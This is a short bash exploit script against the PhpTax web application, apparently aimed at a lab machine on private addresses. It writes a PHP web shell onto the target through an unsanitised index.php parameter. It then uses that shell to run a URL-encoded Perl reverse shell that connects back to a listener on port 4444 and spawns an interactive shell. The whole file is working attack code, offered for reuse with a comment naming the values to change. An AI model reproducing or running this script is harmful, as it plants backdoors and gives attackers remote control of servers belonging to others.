#!/bin/bash

#things to be changed : payload, url 

payload="perl%20-e%20%27use%20Socket%3B%24i%3D%22172.16.62.133%22%3B%24p%3D4444%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22sh%20-i%22%29%3B%7D%3B%27"
url="http://172.16.62.134:8080/phptax/"
file="index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E"
# creating rce.php on the target
function create_rce {
        curl -A -s "Mozilla/4.0" $url$file
}
# exploiting the target
function exploiting {
        curl -A "Mozilla/4.0" http://172.16.62.134:8080/phptax/data/rce.php?cmd=$1

}

if [ $# -eq 0 ]
then
        create_rce
        exploiting $payload
else
        echo "Usage:"
        echo "$0 payload"
fi
